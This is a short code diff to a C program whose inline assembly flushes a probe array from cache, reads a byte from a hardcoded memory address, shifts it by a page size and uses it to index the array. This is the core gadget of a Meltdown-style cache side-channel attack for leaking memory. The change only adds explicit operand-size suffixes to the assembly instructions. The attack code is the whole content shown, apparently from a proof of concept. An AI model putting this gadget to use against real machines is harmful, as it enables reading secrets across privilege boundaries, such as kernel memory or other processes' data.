@@ -32,11 +32,11 @@ int main() {
 		_mm_clflush(&array[PAGE_SIZE*i]);
 
 	asm volatile ("" : : "b"(array));
-	asm volatile ("mov $140726711520994, %rcx");
-	asm volatile ("xor %rax, %rax");
-	asm volatile ("mov (%rcx), %al");
-	asm volatile ("shl $0xc, %rax");
-	asm volatile ("mov (%rbx,%rax), %rbx");
+	asm volatile ("movq $140726711520994, %rcx");
+	asm volatile ("xorq %rax, %rax");
+	asm volatile ("movb (%rcx), %al");
+	asm volatile ("shlq $0xc, %rax");
+	asm volatile ("movq (%rbx,%rax), %rbx");
 
 end:
 	// puts("receiving end");
